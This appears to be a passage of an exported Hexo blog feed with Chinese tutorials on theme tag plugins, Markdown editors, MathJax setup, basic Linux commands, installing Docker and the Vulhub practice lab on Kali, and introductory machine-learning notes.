<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I heard the echo, &#123;% label default@from the valleys and the heart %&#125;</span><br><span class="line">Open to the lonely soul of &#123;% label info@sickle harvesting %&#125;</span><br><span class="line">Repeat outrightly, but also repeat the well-being of</span><br><span class="line">Eventually &#123;% label warning@swaying in the desert oasis %&#125;</span><br><span class="line">&#123;% label success@I believe %&#125; I am</span><br><span class="line">&#123;% label primary@Born as the bright summer flowers %&#125;</span><br><span class="line">Do not withered undefeated fiery demon rule</span><br><span class="line">Heart rate and breathing to bear &#123;% label danger@the load of the cumbersome %&#125;</span><br><span class="line">Bored</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>I heard the echo, <span class="label default">from the valleys and the heart</span> <br><br>Open to the lonely soul of <span class="label info">sickle harvesting</span><br><br>Repeat outrightly, but also repeat the well-being of <br><br>Eventually <span class="label warning">swaying in the desert oasis</span> <br><br><span class="label success">I believe</span> I am <br><br><span class="label primary">Born as the bright summer flowers</span> <br><br>Do not withered undefeated fiery demon rule <br><br>Heart rate and breathing to bear <span class="label danger">the load of the cumbersome</span> <br><br>Bored</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<p>可在主题配置文件中设置 <code>label: false</code> 来取消 label 标签默认 CSS 样式。</p>
<h3 id="button-按钮"><a href="#button-按钮" class="headerlink" title="button 按钮"></a>button 按钮</h3><p>通过 button 标签可以快速添加带有主题样式的按钮，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% button [url], [text], [icon class], [title] %&#125;</span><br><span class="line"></span><br><span class="line"># 也可简写为：</span><br><span class="line">&#123;% btn [url], [text], [icon class], [title] %&#125;</span><br></pre></td></tr></table></figure>

<p>其中各参数含义如下：</p>
<ul>
<li>url：绝对或相对路径</li>
<li>text：按钮文字</li>
<li>icon class：FontAwesome 图标包括 fa-fw | fa-lg | fa-2x | fa-3x | fa-4x | fa-5x 等</li>
<li>title：鼠标悬停时的工具提示</li>
</ul>
<p>使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% btn #, Home, %&#125;</span><br></pre></td></tr></table></figure>

<a class="btn" href="#">
            <i class="fa fa-"></i>Home
          </a>

<h3 id="tabs-选项标签"><a href="#tabs-选项标签" class="headerlink" title="tabs 选项标签"></a>tabs 选项标签</h3><p>tabs 标签用于快速创建 tabs 选项卡，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs [Unique name], [index] %&#125;</span><br><span class="line">  &lt;!-- tab [Tab caption]@[icon] --&gt;</span><br><span class="line">  标签页内容（支持行内标签）</span><br><span class="line">  &lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>

<p>其中各参数含义如下：</p>
<ul>
<li>Unique name: 全局唯一的 Tab 名称，将作为各个标签页的 id 属性前缀</li>
<li>index: 当前激活的标签页索引，如果未定义则默认选中显示第一个标签页，如果设为 -1 则默认隐藏所有标签页</li>
<li>Tab caption: 当前标签页的标题，如果不指定则会以 Unique name 加上索引作为标题</li>
<li>icon: 在标签页标题中添加 FontAwesome 图标</li>
</ul>
<p>使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Example , 2 %&#125;</span><br><span class="line">&lt;!-- tab  @fab fa-github --&gt;</span><br><span class="line">**This is Tab 1.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab Solution 2 --&gt;</span><br><span class="line">**This is Tab 2.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab Solution 3 @paw --&gt;</span><br><span class="line">**This is Tab 3.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>

<div class="tabs" id="example-"><ul class="nav-tabs"><li class="tab"><a href="#example--1"><i class="fab fa-github"></i></a></li><li class="tab active"><a href="#example--2">Solution 2</a></li><li class="tab"><a href="#example--3"><i class="fa fa-paw"></i>Solution 3</a></li></ul><div class="tab-content"><div class="tab-pane" id="example--1"><p><strong>This is Tab 1.</strong></p></div><div class="tab-pane active" id="example--2"><p><strong>This is Tab 2.</strong></p></div><div class="tab-pane" id="example--3"><p><strong>This is Tab 3.</strong></p></div></div></div>

<h3 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a>video 标签</h3><p>我们还可以在网页中插入 video ，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% video [url] %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="突破容器限制宽度的图片"><a href="#突破容器限制宽度的图片" class="headerlink" title="突破容器限制宽度的图片"></a>突破容器限制宽度的图片</h3><p>当使用此标签引用图片时，图片将自动扩大 26% ，并突破文章容器的宽度。此标签使用于需要突出显示的图片, 图片的扩大与容器的偏差从视觉上提升图片的吸引力。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># HTML方式:</span><br><span class="line">&lt;img src=&quot;[imageurl]&quot; class=&quot;full-image&quot; /&gt;</span><br><span class="line"></span><br><span class="line"># 标签 方式</span><br><span class="line">&#123;% fullimage [image-url], [alt], [title] %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="引用站内链接"><a href="#引用站内链接" class="headerlink" title="引用站内链接"></a>引用站内链接</h3><p>我们还可以通过如下语法引入站内文章的地址或链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% [post_path] [slug] %&#125;</span><br><span class="line">&#123;% [post_link] [slug] [title] %&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>slug：表示 _post 目录下的 Markdown 文件名</li>
<li>post_path：将会渲染为文章的地址，即 permalink</li>
<li>post_link：将会渲染为链接</li>
<li>title：指定链接标题</li>
</ul>
<p>如以下标签将会生成 <code>/_posts/My-First-Blog.html</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_path My-First-Blog %&#125;</span><br></pre></td></tr></table></figure>

<p>而以下标签则会生成 <a href="/2021/07/31/My-First-Blog/" title="MyFirstBlog">MyFirstBlog</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link My-First-Blog MyFirstBlog %&#125;</span><br></pre></td></tr></table></figure>

<p>这种站内引用方式比直接使用 url 引用的形式更为可靠，因为即使修改了 <code>permalink</code> 格式，或者修改了文章的路由地址，只要 Markdown 文件名没有发生改变，引用链接都不会失效。</p>
<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>若要在网页中添加流程图，可使用 <code>mermaid</code> 标签来描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid type%&#125;</span><br><span class="line">流程图内容</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Markdown-写作工具"><a href="#Markdown-写作工具" class="headerlink" title="Markdown 写作工具"></a>Markdown 写作工具</h2><blockquote>
<p>Sublime Text3</p>
</blockquote>
<p>Sublime Text 是一款流行的代码编辑器软件，也是 HTML 和散文先进的文本编辑器，可运行在 Linux ， Windows 和 Mac OS X 。也是许多程序员喜欢使用的一款文本编辑器软件。</p>
<p>经同学推荐在学习PHP的时候爱上了这款编辑器，除了python语言会使用PyCharm平时全都用的Sublime Text3，它包含丰富插件，可以作为文档编辑器，同时支持 Markdown 语法，搭配 Markdown Editing 和 MarkdownLivePreview 插件可进一步方便我们 Markdown 写作并在线预览。</p>
<p><img src="/images/SublimeText3.png" alt="Sublime Text3 界面"></p>
<blockquote>
<p>Typora</p>
</blockquote>
<p>Typora 是我新发现的一款md文件编辑器，可以为我们提供作为读者和作者的无缝体验，它删除了预览窗口、模式切换器、markdown 源代码的语法符号以及所有其他不必要的干扰，转而提供了真正的实时预览功能，可帮助我们专注于内容本身。</p>
<p>其默认显示预览效果，可选择显示为 <code>源代码模式</code> 查看Markdown 语法下的源代码方便我们编辑。</p>
<p><img src="/images/Typora.png" alt="Typora 界面"></p>
<blockquote>
<p>Mweb</p>
</blockquote>
<p>MWeb 是 Mac 平台上一款专业的 Markdown 写作、记笔记、静态博客生成软件，支持图片上传。他的与众不同在于，除了具备一般 Markdown 编辑器所具有的一切基本功能之外，还具备以下特性：</p>
<ul>
<li>使用原生的 macOS 技术打造，追求与系统的完美结合</li>
<li>支持 LaTeX 公式、 TOC 、表格插入 、代码块、任务列表、脚注等</li>
<li>支持截图并粘贴、复制并粘贴、拖拽等方式插入图片并直接显示在编辑器内</li>
<li>支持丰富的画图库，如 mermaid、echarts、plantuml、流程图、时序图等</li>
<li>支持图片上传服务（图床，如 Google Photos、Imgur、七牛云、又拍云和自定义的图床服务</li>
<li>支持导出为图片、HTML、Epub、PDF、RTF、Docx</li>
<li>支持一键发布到各大博客平台和笔记软件中，拥有及其强大的发布功能</li>
</ul>
<p>这款是最初发表博客时发现的，可以在 Mac Apple Store 花费 ¥128 购买，iPad倒是下载了感观来说瞧着不错的样子但平时都使用电脑在进行操作。</p>
<p><img src="/images/MWeb.png" alt="MWeb 界面"></p>
<blockquote>
<p>One Markdown</p>
</blockquote>
<p>One Markdown 是一款简单快速的，支持纯文本、Markdown 和 Textbundle 的编辑器，它有以下的特色：</p>
<ul>
<li>完整支持 CommonMark 标准和 GitHub Flavored Markdown (GFM)</li>
<li>语法高亮和解析成 HTML 用的都是同一个基础库</li>
<li>采用了 WKWebView，可以边编辑边预览</li>
<li>支持编辑器内显示图片，不但支持本地图片，也支持显示网络图片了，并且还支持 svg、webP、HEIC 等格式</li>
<li>支持创建和编辑 Textbundle 文档</li>
<li>支持数学公式、Echarts、mermaid</li>
</ul>
<p>搜索 Mweb 时发现的，都是由 ou lvhai 开发的，轻量级的选择是 One Markdown，功能完善且强大的选择是 MWeb 。</p>
<p><img src="/images/OneMarkdown.png" alt="One Markdown 界面"></p>
<blockquote>
<p><a href="https://dillinger.io/">Dillinger</a></p>
</blockquote>
<p>Dillinger 是一款支持云的、移动就绪的、兼容离线存储的、<br>AngularJS 驱动的在线 HTML5 Markdown 编辑器，界面简洁，可在线实时预览。</p>
<p><img src="/images/Dillinger.png" alt="Dillinger 界面"></p>
<hr>
<h4> 参考链接   </h4>

<ol>
<li><a href="https://theme-next.iissnan.com/getting-started.html">开始使用 - NexT 使用文档</a></li>
<li><a href="http://yearito.cn/posts/hexo-writing-skills.html">Hexo 搭建个人博客系列：写作技巧篇 - Yearito’s Blog</a></li>
<li><a href="https://wilenwu.github.io/posts/hexo/Hexo-tag-plugins.html">Hexo 标签插件的使用 - Wilen’s Blog</a></li>
<li><a href="https://blog.csdn.net/weixin_34348805/article/details/91389277">在Hexo博客中插入图片 - CSDN博客</a></li>
</ol>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建之结合MathJax插入数学公式</title>
    <url>/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="安装与配置-hexo-math"><a href="#安装与配置-hexo-math" class="headerlink" title="安装与配置 hexo-math"></a>安装与配置 hexo-math</h3><p>首先安装 <a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-math">hexo-math</a>插件，该插件使用 <code>MathJax/KaTex</code> 来渲染数学公式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-math --save</span><br></pre></td></tr></table></figure>

<p>安装完成后，配置hexo目录下的 <code>_config.yml</code>，加入下面配置信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  engine: &#x27;mathjax&#x27;</span><br><span class="line">  mathjax:</span><br><span class="line">    src: custom_mathjax_source</span><br><span class="line">    config:</span><br><span class="line">      # MathJax config</span><br></pre></td></tr></table></figure>

<p>然后打开文件 <code>themes/next/_config.yml</code>，搜索关键词 <code>math</code>，将 <code>enable</code> 标签的值改为 <code>true</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span><br></pre></td></tr></table></figure>

<h3 id="更改-Hexo-渲染引擎"><a href="#更改-Hexo-渲染引擎" class="headerlink" title="更改 Hexo 渲染引擎"></a>更改 Hexo 渲染引擎</h3><p>Hexo 的默认渲染引擎是 <code>hexo-renderer-marked</code>，需要将它替换为 <code>hexo-renderer-kramed</code><br>在安装 <code>hexo-renderer-kramed</code> 之前，需要卸载 <code>hexo-renderer-marked</code>，顺序执行以下两行命令完成卸载与安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm uninstall hexo-renderer-marked --save</span><br><span class="line">$ npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>

<h3 id="解决语义冲突"><a href="#解决语义冲突" class="headerlink" title="解决语义冲突"></a>解决语义冲突</h3><p>在 markdown 中，斜体用下划线 <code>_</code> 或星号 <code>*</code> 表示，而在 <code>LaTex</code> 中，下划线 <code>_</code> 表示下标，为了解决这个冲突，需要修改两处：<br>在博客根目录下，进入 <code>node_modules\kramed\lib\rules\inline.js</code> ，修改第 11 行 <code>escape</code> 变量的值（这一步是在原基础上对 <code>,&#123;,&#125;</code> 的 <code>转义(escape)</code> ）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">修改后：escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br></pre></td></tr></table></figure>

<p>同时，把第20行的em变量也做相应的修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br><span class="line">修改后：em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure>

<h3 id="博客打开-MathJax-开关"><a href="#博客打开-MathJax-开关" class="headerlink" title="博客打开 MathJax 开关"></a>博客打开 MathJax 开关</h3><p>最后，在博客的 <code>Front-matter</code> 里，添加一行 <code>mathjax: true</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxxxxxxxxxxxxxx</span><br><span class="line">date: 2020-02-22 15:44:53</span><br><span class="line">tags: xxx</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>因为不是每次都需要使用，我在模版 <code>/scaffolds/draft.md</code> 里面添加了 <code>mathjax: false</code>，需要使用的时候再手动更改为 <code>true</code> 即可。</p>
<h3 id="Markdown-勾选内联公式"><a href="#Markdown-勾选内联公式" class="headerlink" title="Markdown 勾选内联公式"></a>Markdown 勾选内联公式</h3><p>博客写作采用的<a href="https://sspai.com/post/64488">One Markdown</a>软件，直接支持数学公式，不需要进行配置</p>
<p>平时记笔记写周报用的<a href="https://www.typora.net/">Typora</a>软件，需要手动修改一下设置勾选：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 -&gt; 偏好设置 -&gt; Markdown -&gt; 内联公式</span><br></pre></td></tr></table></figure>
<p><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Typora-File.jpg" alt="settings"><br><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Markdown-settings.jpg" alt="settings"></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
<p>公式单行居中显示</p>
</blockquote>
<p><code>LaTex</code> 公式两端的 <code>$$</code> 表示公式居中显示，键入下面的 <code>LaTex</code> 公式，代码及效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $$</span><br></pre></td></tr></table></figure>
<p>$$ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $$</p>
<blockquote>
<p>公式嵌入到句子中</p>
</blockquote>
<p>若想在一句话中嵌入公式，则只需要在 <code>LaTex</code> 公式两端用一个 <code>$</code>，代码及效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在公式 $ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</span><br></pre></td></tr></table></figure>
<p>在公式 $ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</p>
<h3 id="数学公式-LaTex-基本元素语法"><a href="#数学公式-LaTex-基本元素语法" class="headerlink" title="数学公式 LaTex 基本元素语法"></a>数学公式 LaTex 基本元素语法</h3><p>待续。。。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令合集</title>
    <url>/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h3 id="一、Linux-命令行切换路径"><a href="#一、Linux-命令行切换路径" class="headerlink" title="一、Linux 命令行切换路径"></a>一、Linux 命令行切换路径</h3><h4 id="1-切换目录"><a href="#1-切换目录" class="headerlink" title="1. 切换目录"></a>1. 切换目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入用户主目录</span><br><span class="line">cd ~</span><br><span class="line"># 返回进入此目录之前所在目录</span><br><span class="line">cd - </span><br><span class="line"># 返回上级目录(若为根目录则显示/,切换后无变化）</span><br><span class="line">cd ..</span><br><span class="line"># 返回上两级目录</span><br><span class="line">cd ../..</span><br></pre></td></tr></table></figure>
<h4 id="2-显示当前路径"><a href="#2-显示当前路径" class="headerlink" title="2. 显示当前路径"></a>2. 显示当前路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
<h4 id="3-显示路径下目录列表"><a href="#3-显示路径下目录列表" class="headerlink" title="3. 显示路径下目录列表"></a>3. 显示路径下目录列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 显示当前目录下非隐藏文件列表</span><br><span class="line">ls</span><br><span class="line"># 显示当前目录下所有文件列表（.开头的即为隐藏文件）</span><br><span class="line">ls -a</span><br><span class="line"># 显示并输出为长格式列表</span><br><span class="line">ls -l</span><br><span class="line"># 以长格式列表排列显示文件大小日期等</span><br><span class="line">ls -lh</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="二、Linux-命令行复制-移动文件-夹"><a href="#二、Linux-命令行复制-移动文件-夹" class="headerlink" title="二、Linux 命令行复制/移动文件(夹)"></a>二、Linux 命令行复制/移动文件(夹)</h3><h4 id="1-复制单个文件到另一个文件夹"><a href="#1-复制单个文件到另一个文件夹" class="headerlink" title="1. 复制单个文件到另一个文件夹"></a>1. 复制单个文件到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp A路径 B路径</span><br></pre></td></tr></table></figure>
<p>例如复制 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>E空文件夹</code> 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /var/www/xin/A.html /usr/xxx/ </span><br></pre></td></tr></table></figure>
<h4 id="2-复制文件夹到另一个文件夹"><a href="#2-复制文件夹到另一个文件夹" class="headerlink" title="2. 复制文件夹到另一个文件夹"></a>2. 复制文件夹到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp -r A路径 B路径</span><br></pre></td></tr></table></figure>
<p>例如复制 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -r /var/www/xin/ /usr/xxx/ </span><br></pre></td></tr></table></figure>
<h4 id="3-移动文件-夹-到另一个文件夹"><a href="#3-移动文件-夹-到另一个文件夹" class="headerlink" title="3. 移动文件(夹)到另一个文件夹"></a>3. 移动文件(夹)到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">mv A路径 B路径</span><br></pre></td></tr></table></figure>
<p>例如移动 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /var/www/xin/A.html /usr/xxx/ </span><br><span class="line">mv /var/www/xin /usr/xxx</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="三、通过-ssh-拷贝远程-Linux-服务器上文件-夹"><a href="#三、通过-ssh-拷贝远程-Linux-服务器上文件-夹" class="headerlink" title="三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)"></a>三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)</h3><h4 id="1-Mac-拷贝服务器文件到本地"><a href="#1-Mac-拷贝服务器文件到本地" class="headerlink" title="1. Mac 拷贝服务器文件到本地"></a>1. Mac 拷贝服务器文件到本地</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
<p>比如用户 <code>user</code> 拷贝 <code>xxx.xxx.xxx.xxx</code> 服务器上 <code>data.py</code> 文件夹到本地桌面，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp user@xxx.xxx.xxx.xxx:/home/user/Desktop/data.py /Users/user/Desktop</span><br></pre></td></tr></table></figure>

<h4 id="2-Mac-拷贝本地文件到服务器"><a href="#2-Mac-拷贝本地文件到服务器" class="headerlink" title="2. Mac 拷贝本地文件到服务器"></a>2. Mac 拷贝本地文件到服务器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp A路径 用户名@IP地址:B路径</span><br></pre></td></tr></table></figure>
<p>比如用户 <code>user</code> 拷贝本地文件 <code>a.jpg</code> 到 <code>xxx.xxx.xxx.xxx</code> 服务器上作为 <code>b.jpg</code>，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /Users/xxx/Desktop/a.jpg user@xxx.xxx.xxx.xxx:/home/user/Desktop/Data/b.jpg</span><br></pre></td></tr></table></figure>

<h4 id="3-Mac-拷贝文件夹"><a href="#3-Mac-拷贝文件夹" class="headerlink" title="3. Mac 拷贝文件夹"></a>3. Mac 拷贝文件夹</h4><p>参考以上命令，只需在 <code>scp</code> 后多添加指令参数 <code>–r</code> 即可:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp –r  …</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="四、Linux-命令行查看-编辑文件"><a href="#四、Linux-命令行查看-编辑文件" class="headerlink" title="四、Linux 命令行查看/编辑文件"></a>四、Linux 命令行查看/编辑文件</h3><p>可以使用 <code>vi</code> 或 <code>vim</code> 查看/编辑文件，后跟文件路径(当前路径直接跟文件名)即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /path/to/file</span><br></pre></td></tr></table></figure>
<p>这时就进入了指令模式，可以看见文件内容（如果文件存在的话，如果此文件不存在，该命令会创建文件）</p>
<ul>
<li>处于光标之下的字符使用 <code>x</code> 字符删除（仅限指令模式）</li>
<li>按 <code>i</code> 就进入了 <code>编辑insert</code> 模式，便可以开始编辑文本了</li>
<li>按 <code>ESC</code> 退出编辑模式</li>
<li>如果没做修改退出文本，键入 <code>:q</code>；做了修改但不保存文本退出，键入 <code>:q!</code>；做了修改并保存退出文本，键入 <code>:wq</code> </li>
</ul>
<p>vi 和 vim 都是 Linux 中的编辑器，不同的是 vim 比较高级，可以视为 vi 的升级版本，vi 使用于文本编辑，vim 更适用于 coding 。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装Docker和Vulhub步骤</title>
    <url>/2022/07/04/Linux%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>!(1.root切换)[kali切换root用户]</p>
<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>

<p>下载docker引擎并查看其版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>接下来安装docker-compose并查看其版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>

<p>下载vulhub：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>

<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
        <tag>Vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine Learning 2021 Spring - Day1</title>
    <url>/2021/09/06/Machine-Learning-2021-Spring-Day1/</url>
    <content><![CDATA[<h2 id="一、机器学习基本概念"><a href="#一、机器学习基本概念" class="headerlink" title="一、机器学习基本概念"></a>一、机器学习基本概念</h2><blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>Machine Learning  $\approx$  Looking for Function</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<p>机器学习就是让机器具备找一个函数式的能力，即一种实现人工智能的方法</p>
<h3 id="Different-types-of-Functions"><a href="#Different-types-of-Functions" class="headerlink" title="Different types of Functions"></a>Different types of Functions</h3><p><strong><u>Regression</u></strong>: outputs a scalar.  它的输出是一个数值。</p>
<p><strong><u>Classification</u></strong>: outputs the correct one from given options(classes).  从设定好的选项里面选择一个当作输出。</p>
<p><strong><u>Structured Learning</u></strong>: create something with structure(image, document).   机器学会创造这件事。</p>
<h3 id="Linear-Models-之机器学习找函数式的过程-——-三个步骤"><a href="#Linear-Models-之机器学习找函数式的过程-——-三个步骤" class="headerlink" title="Linear Models 之机器学习找函数式的过程 —— 三个步骤"></a>Linear Models 之机器学习找函数式的过程 —— 三个步骤</h3><blockquote>
<ol>
<li>Function with Unknown Parameters</li>
</ol>
</blockquote>
<p>写出一个带有未知参数的函数式F， <strong>Model</strong>  $y = b + wx_1$ </p>
<ul>
<li>$y$ : Model, no. of views on 2/26</li>
<li>$x_1$ : feature, no. of views on 2/25</li>
<li>$w$ : weight, unkown parameters(learned from data)</li>
<li>$b$ : bias, unkown parameters(learned from data)</li>
</ul>
<blockquote>
<ol start="2">
<li>Define Loss from Traning Data</li>
</ol>
</blockquote>
<p>定义一个loss函数，输入是Model里面的参数 </p>
<p><i class="fa fa-arrow-circle-right"></i> Loss is a function of parameters  $L(b, w)$</p>
